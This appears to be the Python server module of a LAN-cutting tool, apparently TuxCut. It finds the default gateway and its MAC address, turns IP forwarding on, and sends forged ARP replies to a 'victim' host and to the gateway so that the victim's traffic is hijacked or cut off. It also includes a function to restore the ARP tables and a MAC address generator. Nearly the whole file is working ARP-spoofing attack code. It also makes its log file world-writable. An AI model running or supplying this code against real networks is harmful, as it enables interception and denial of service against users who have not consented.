import os
from pathlib import Path
import sys
import logging
import socket
import struct
import random
from scapy.all import *
import psutil
import dns.resolver
import dns.reversename


LOG_DIR = '/var/log/tuxcut'
if not os.path.isdir(LOG_DIR):
    os.mkdir(LOG_DIR)
    server_log = Path(os.path.join(LOG_DIR, 'tuxcut.log'))
    server_log.touch(exist_ok=True)
    server_log.chmod(0o666)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('tuxcut-server')
handler = logging.FileHandler(os.path.join(LOG_DIR, 'tuxcut.log'))
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)

logger.addHandler(handler)


def get_hostname(ip):
    """
    Use dnspython to get the hostname for an IP address.
    """
    try:
        rev_name = dns.reversename.from_address(ip)
        answer = dns.resolver.resolve(rev_name, "PTR")
        return str(answer[0]).rstrip('.')
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
        return ''
    except Exception as e:
        logger.error(f"Error resolving hostname for {ip}: {e}", exc_info=True)
        return ''


def get_default_gw():
    """
    Get the default gw ip address with the iface
    """
    gw = dict()
    try:
        gws = psutil.net_if_addrs()
        for iface, addrs in gws.items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    # This is a MAC address, but we need the gateway IP first
                    pass

        # Using psutil's net_if_gateways is not straightforward.
        # Let's stick to a method that is more reliable for finding the default gateway.
        with open("/proc/net/route") as f:
            for line in f:
                fields = line.strip().split()
                if fields[1] == '00000000':
                    gw_ip = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
                    iface = fields[0]
                    
                    # Get MAC of gateway
                    gw_mac = ''
                    results, unanswered = sr(ARP(op=1, psrc=get_if_addr(iface), pdst=gw_ip),
                                           timeout=2, verbose=0)
                    if results:
                        for s, r in results:
                            if r.psrc == gw_ip:
                                gw_mac = r.hwsrc
                                break

                    gw['ip'] = gw_ip
                    gw['mac'] = gw_mac
                    gw['hostname'] = get_hostname(gw_ip)
                    gw['iface'] = iface
                    
                    if not gw_mac:
                        logger.info('Could not get gateway MAC address')
                    else:
                        logger.info('Gateway information retrieved successfully')
                    return gw
    except Exception as e:
        logger.error(f"Error in get_default_gw: {str(e)}")
    
    return gw


def get_my(iface):
    """
    find the IP and MAC  addressess for the given interface
    """
    my = dict()
    try:
        addrs = psutil.net_if_addrs()[iface]
        for addr in addrs:
            if addr.family == socket.AF_INET:
                my['ip'] = addr.address
            if addr.family == psutil.AF_LINK:
                my['mac'] = addr.address
        my['hostname'] = get_hostname(my['ip'])
        logger.info('My info succssfully retrieved')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
    return my


def enable_ip_forward():
    """
    Enables IP forwarding by writing '1' to /proc/sys/net/ipv4/ip_forward.
    """
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        logger.info('IP forward Enabled')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def disable_ip_forward():
    """
    Disables IP forwarding by writing '0' to /proc/sys/net/ipv4/ip_forward.
    """
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
        logger.info('IP Forward Disabled')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def arp_spoof(victim):

    gw = get_default_gw()
    my = get_my(gw['iface'])
    logger.info('attacking host {}'.format(victim['ip']))

    # Cheat the victim
    to_victim = ARP()
    to_victim.op = 2    # make packet 'is-at'
    to_victim.psrc = gw['ip']
    to_victim.hwsrc = my['mac']
    to_victim.pdst = victim['ip']
    to_victim.hwdst = victim['mac']

    # Cheat the gateway
    to_gw = ARP()
    to_gw.op = 2  # make packet 'is-at'
    to_gw.psrc = victim['ip']
    to_gw.hwsrc = my['mac']
    to_gw.pdst = gw['ip']
    to_gw.hwdst = gw['mac']
    try:
        send(to_victim, count=5)
        send(to_gw, count=5)
        logger.info('Done Spoofing host')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def arp_unspoof(victim):
    gw = get_default_gw()
    logger.info('resuming host {}'.format(victim['ip']))
    # Fix  the victim arp table
    to_victim = ARP()
    to_victim.op = 2  # make packet 'is-at'
    to_victim.psrc = gw['ip']
    to_victim.hwsrc = gw['mac']
    to_victim.pdst = victim['ip']
    to_victim.hwdst = victim['mac']

    # Fix the gateway arp table
    to_gw = ARP()
    to_gw.op = 2  # make packet 'is-at'
    to_gw.psrc = victim['ip']
    to_gw.hwsrc = victim['mac']
    to_gw.pdst = gw['ip']
    to_gw.hwdst = gw['mac']

    try:
        send(to_victim, count=10)
        send(to_gw, count=10)
        logger.info('Done Resuming host')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def generate_mac():
	return ':'.join(map(lambda x: "%02x" % x, [ 0x00,
												random.randint(0x00, 0x7f),
												random.randint(0x00, 0x7f),
												random.randint(0x00, 0x7f),
												random.randint(0x00, 0xff),
												random.randint(0x00, 0xff)]))
